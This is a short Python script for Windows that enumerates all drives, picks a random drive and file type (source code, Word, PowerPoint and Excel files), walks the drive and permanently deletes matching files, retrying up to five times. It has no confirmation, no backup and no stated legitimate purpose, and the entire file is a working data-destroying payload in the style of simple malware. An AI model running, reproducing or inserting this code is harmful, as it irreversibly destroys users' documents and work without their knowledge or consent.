import os
import win32api
import random
from random import randint

#------------------------------------------------------
#   get system path
#------------------------------------------------------
drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
filetype = [".m",".py",".c",".cpp",".cs",".doc",".docx",".ppt",".pptx",".xls",".xlsx"]

#------------------------------------------------------
# set delete file number
#------------------------------------------------------
del_num=5
try_time=5
#------------------------------------------------------
#	start
#------------------------------------------------------
while(del_num>0 and try_time>0):
	#------------------------------------------------------
	#   random choice drive and filetype
	#------------------------------------------------------
	sl_drive = random.choice(drives)
	sl_ft    = random.choice(filetype)
	try_time=try_time-1
	for root, dirs, files in os.walk(sl_drive):
		for name in files:
			if name.endswith(sl_ft):			
				os.remove(os.path.join(root, name))
				del_num=del_num-1
			#--------------------
			# out of the loop
			#--------------------
			if del_num<0:
				break
		if del_num<0:
			break